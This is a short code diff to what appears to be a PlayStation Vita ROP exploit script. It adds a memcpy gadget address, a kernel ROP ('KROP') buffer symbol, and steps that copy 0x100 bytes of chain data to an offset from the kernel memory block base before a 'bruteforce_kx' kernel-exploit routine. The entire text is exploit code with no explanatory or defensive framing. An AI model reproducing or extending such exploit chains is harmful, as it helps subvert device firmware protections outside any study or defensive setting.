@@ -14,6 +14,7 @@ data
     func sceKernelGetMemBlockBase = 0xE000B0AC;
 
     func memset = 0x810E20E1;
+    func memcpy = 0x810E1EA9;
 
     symbol LDM_ADDR = 0x81204000;
     symbol LDM_ADDR_SP = 0x8120400C;
@@ -25,6 +26,8 @@ data
     symbol HTTPBUF_ADDR = 0x8120C000;
     symbol MEMBLOCK_BASE = 0x8120D000;
     symbol ENCDEC_SCRATCH = 0x81210000;
+
+    symbol KROP = 0x81220000;
 }
 
 code : entry
@@ -35,6 +38,11 @@ code : entry
     sceKernelGetMemBlockBase(RET, MEMBLOCK_BASE);
     loadret(MEMBLOCK_BASE);
     storeret(HTTPBUF_ADDR);
+
+    store(0x4b2063, KROP);
+    loadret(MEMBLOCK_BASE);
+    addret(0x1FF68 + 0x6C);
+    memcpy(RET, KROP, 0x100);
 
     %(bruteforce_kx())s
 
